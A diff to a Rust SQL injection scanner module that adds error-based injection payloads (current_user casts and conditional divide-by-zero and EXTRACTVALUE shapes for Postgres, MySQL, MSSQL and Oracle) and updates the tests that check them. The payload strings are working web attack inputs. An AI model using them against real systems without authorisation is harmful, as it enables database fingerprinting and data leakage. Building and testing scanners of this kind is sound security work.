@@ -20,7 +20,8 @@ pub struct ErrorPayload {
 /// - MySQL: `EXTRACTVALUE` (legacy), `GROUP BY COUNT` (legacy), `UPDATEXML`,
 ///   `EXP(~)` BIGINT overflow, `JSON_KEYS`
 /// - Postgres: `CAST(version() AS int)` (legacy), `CAST(current_database())`
-///   (legacy), `CAST(chr(126)||version()||chr(126) AS int)`
+///   (legacy), `CAST(chr(126)||version()||chr(126) AS int)`,
+///   `CAST((SELECT current_user) AS int)` (Vulnsy cheat-sheet shape)
 /// - MSSQL: `CONVERT(int,@@version)` (legacy, Msg 8114),
 ///   `CONVERT(int,DB_NAME())` (legacy), `CAST(@@version AS int)` (Msg 245),
 ///   `FOR XML PATH('')`
@@ -94,9 +95,29 @@ pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
                 "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --",
                 "oracle",
             ),
+            ("' AND 1=CAST((SELECT current_user) AS int) --", "postgres"),
             (
                 "' AND (CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END) --",
                 "sqlite",
+            ),
+            // PortSwigger conditional-error shapes (error only when the
+            // condition holds; appended last so L1/L2 budgets stay
+            // byte-identical).
+            (
+                "' AND IF(1=1,EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)),'a') -- -",
+                "mysql",
+            ),
+            (
+                "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END) --",
+                "postgres",
+            ),
+            (
+                "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END) --",
+                "mssql",
+            ),
+            (
+                "' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --",
+                "oracle",
             ),
         ]
         .into_iter()
@@ -175,8 +196,22 @@ mod tests {
             mysql.iter().any(|p| p.payload.contains("JSON_KEYS")),
             "{mysql:?}"
         );
+        assert!(
+            mysql
+                .iter()
+                .any(|p| p.payload.contains("IF(1=1,EXTRACTVALUE")),
+            "PortSwigger conditional-error: {mysql:?}"
+        );
         let pg = error_payloads_for(Some("postgres"));
         assert!(pg.iter().any(|p| p.payload.contains("chr(126)")), "{pg:?}");
+        assert!(
+            pg.iter().any(|p| p.payload.contains("current_user")),
+            "Vulnsy CAST(current_user) variant: {pg:?}"
+        );
+        assert!(
+            pg.iter().any(|p| p.payload.contains("1/(SELECT 0)")),
+            "PortSwigger conditional-error: {pg:?}"
+        );
         let sql_server = error_payloads_for(Some("mssql"));
         assert!(
             sql_server
@@ -187,6 +222,12 @@ mod tests {
         assert!(
             sql_server.iter().any(|p| p.payload.contains("CAST")),
             "{sql_server:?}"
+        );
+        assert!(
+            sql_server
+                .iter()
+                .any(|p| p.payload.contains("CASE WHEN (1=1) THEN 1/0")),
+            "PortSwigger conditional-error: {sql_server:?}"
         );
         let oracle = error_payloads_for(Some("oracle"));
         assert!(
@@ -200,6 +241,10 @@ mod tests {
         assert!(
             oracle.iter().any(|p| p.payload.contains("DBMS_XDB")),
             "{oracle:?}"
+        );
+        assert!(
+            oracle.iter().any(|p| p.payload.contains("TO_CHAR(1/0)")),
+            "PortSwigger conditional-error: {oracle:?}"
         );
         let sqlite = error_payloads_for(Some("sqlite"));
         assert_eq!(sqlite.len(), sqlite_p::sqlite_error_payloads().len());
@@ -218,8 +263,9 @@ mod tests {
     #[test]
     fn generic_sweeps_all_dbms_at_high_level() {
         let g = error_payloads_for(None);
-        // 6 legacies (4 historical + 2 sqlite) + 5 variants (4 + 1 sqlite).
-        assert_eq!(g.len(), 11);
+        // 6 legacies (4 historical + 2 sqlite) + 10 variants (6 + 4
+        // PortSwigger conditional-errors).
+        assert_eq!(g.len(), 16);
         for dbms in ["mysql", "postgres", "mssql", "oracle", "sqlite"] {
             assert!(g.iter().any(|p| p.dbms == dbms), "missing {dbms}");
         }
@@ -229,7 +275,7 @@ mod tests {
     fn all_payloads_start_with_legacies() {
         let all = all_error_payloads();
         // 2 legacies × 5 DBMS = 10 legacies first.
-        assert_eq!(all.len(), 5 + 3 + 4 + 5 + 4);
+        assert_eq!(all.len(), 6 + 5 + 5 + 6 + 4);
         assert!(all[0].payload.contains("EXTRACTVALUE"));
         assert!(all[2].payload.contains("CAST((SELECT version())"));
         assert!(all[4].payload.contains("CONVERT(int,@@version)"));
